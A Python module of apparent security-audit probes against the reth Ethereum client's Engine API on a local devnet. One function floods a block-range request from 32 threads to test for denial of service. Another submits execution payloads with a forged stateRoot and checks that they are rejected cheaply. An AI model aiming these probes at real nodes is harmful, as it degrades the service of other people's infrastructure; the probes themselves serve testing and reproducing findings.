"""Reusable Engine API probes against reth — RETH-ENG-004 and RETH-BCT-002.

The canonical reproduction bundle lives under `reports/<client>/poc/<id>/`.
This module keeps the shared Engine API helpers and the legacy per-surface
entrypoints for compatibility. ENG-004 uses JWT-authenticated JSON-RPC; BCT-002
fetches a valid payload via forkchoiceUpdated+getPayload, then forges the
stateRoot.
"""

from __future__ import annotations

import json
import os
import sys
import threading
import time
import urllib.error
import urllib.request

from ..drivers.base import make_engine_jwt
from .discover import discover_reth


def _jrpc(url, method, params, secret=None):
    headers = {"Content-Type": "application/json"}
    if secret is not None:
        headers["Authorization"] = f"Bearer {make_engine_jwt(secret)}"
    req = urllib.request.Request(
        url, data=json.dumps({"jsonrpc": "2.0", "method": method, "params": params, "id": 1}).encode(),
        headers=headers,
    )
    try:
        return json.loads(urllib.request.urlopen(req, timeout=10).read())
    except urllib.error.HTTPError as e:
        return {"error": {"http": e.code, "body": e.read()[:160].decode("replace")}}


def eng_004(t, secret, threads=32, seconds=2):
    """ENG-004: flood getPayloadBodiesByRangeV1 with a huge count; measure benign latency."""
    def benign():
        s = time.time()
        _jrpc(t.engine_url, "engine_getClientVersionV1",
              [{"code": "RH", "name": "x", "version": "1", "commit": "00000000"}], secret)
        return time.time() - s

    base = sorted(benign() for _ in range(5))[2]
    stop = threading.Event()
    sent = [0]

    def flood():
        while not stop.is_set():
            _jrpc(t.engine_url, "engine_getPayloadBodiesByRangeV1", ["0x1", "0xffffffffffffffff"], secret)
            sent[0] += 1

    ts = [threading.Thread(target=flood, daemon=True) for _ in range(threads)]
    for th in ts:
        th.start()
    time.sleep(seconds)
    during = sorted(benign() for _ in range(8))
    stop.set()
    print(f"[ENG-004] {sent[0]} abusive reqs in {seconds}s; benign latency base {base*1000:.0f}ms -> during median {during[len(during)//2]*1000:.0f}ms (no starvation if flat)")


def bct_002(t, secret, n=10):
    """BCT-002: newPayload with a forged stateRoot; expect cheap INVALID, no resource growth."""
    import collections

    from ..devnet.kurtosis import KurtosisHarness
    h = KurtosisHarness(samples=2, interval=0.3)
    def rss(): return max(x.rss_mb for x in h.sample_service("repro-reth", "el-1-reth-lighthouse"))
    base = rss()
    codes = collections.Counter()
    for _ in range(n):
        hb = _jrpc(t.rpc_url, "eth_getBlockByNumber", ["latest", False])["result"]
        head, tsv = hb["hash"], int(hb["timestamp"], 16)
        attrs = {"timestamp": hex(tsv + 12), "prevRandao": "0x" + os.urandom(32).hex(),
                 "suggestedFeeRecipient": "0x" + "22" * 20, "withdrawals": [],
                 "parentBeaconBlockRoot": "0x" + os.urandom(32).hex()}
        fcu = _jrpc(t.engine_url, "engine_forkchoiceUpdatedV3",
                    [{"headBlockHash": head, "safeBlockHash": head, "finalizedBlockHash": head}, attrs], secret)
        pid = fcu.get("result", {}).get("payloadId")
        if not pid:
            continue
        time.sleep(0.6)
        pl = _jrpc(t.engine_url, "engine_getPayloadV3", [pid], secret)["result"]["executionPayload"]
        pl["stateRoot"] = "0x" + os.urandom(32).hex()  # forge -> stale blockHash / state mismatch
        r = _jrpc(t.engine_url, "engine_newPayloadV3", [pl, [], "0x" + os.urandom(32).hex()], secret)
        res = r.get("result") or r.get("error") or {}
        codes[res.get("status", str(res)[:20])] += 1
    print(f"[BCT-002] {n} forged newPayload -> {dict(codes)}; reth rss {base:.0f}->{rss():.0f}MiB (cheap reject if flat)")


if __name__ == "__main__":
    t = discover_reth()
    if t is None:
        print("no repro-reth devnet; boot it first (see harness/probes/README.md)")
        sys.exit(1)
    secret = bytes.fromhex(t.jwt_secret)
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    if which in ("all", "eng004"):
        eng_004(t, secret)
    if which in ("all", "bct002"):
        bct_002(t, secret)
